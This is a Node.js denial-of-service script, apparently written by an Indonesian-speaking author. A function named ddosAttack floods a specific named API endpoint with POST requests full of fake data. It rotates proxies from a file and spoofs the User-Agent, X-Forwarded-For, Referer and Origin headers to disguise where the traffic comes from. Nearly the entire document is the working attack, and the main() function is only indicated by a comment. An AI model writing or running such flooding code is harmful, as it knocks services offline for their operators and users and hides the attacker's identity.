const fetch = require('node-fetch');
const faker = require('faker');
const UserAgent = require('user-agents');
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');

const targetUrl = 'https://apipc.my.id/api/v1/ml';
const threads = 10;
const requestsPerThread = 100;
const proxyListFile = 'Phong.txt';

const proxies = fs.readFileSync(proxyListFile, 'utf8').split('\n').filter(Boolean);

async function ddosAttack() {
    for (let i = 0; i < requestsPerThread; i++) {
        try {
            const userAgent = new UserAgent().toString();
            const fakeName = faker.name.findName();
            const fakeEmail = faker.internet.email();

            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const [proxyIp, proxyPort] = proxy.split(':');

            // Data POST acak
            const postData = {
                name: fakeName,
                email: fakeEmail,
                message: faker.lorem.paragraph(),
                timestamp: Date.now(),
            };

            const response = await fetch(targetUrl, {
                method: 'POST',
                headers: {
                    'User-Agent': userAgent,
                    'X-Forwarded-For': faker.internet.ip(),
                    'Referer': faker.internet.url(),
                    'Origin': faker.internet.domainName(),
                    'Content-Type': 'application/json', // Penting!
                },
                body: JSON.stringify(postData), // Ubah data jadi JSON
                agent: new HttpsProxyAgent({
                    host: proxyIp,
                    port: parseInt(proxyPort),
                }),
            });

            console.log(`Thread ${process.threadId}: Request ${i + 1} - Status: ${response.status} - Proxy: ${proxy}`);
        } catch (error) {
            console.error(`Thread ${process.threadId}: Request ${i + 1} - Error: ${error} - Proxy: ${proxy}`);
        }
    }
}

// ... (kode main() sama seperti sebelumnya)
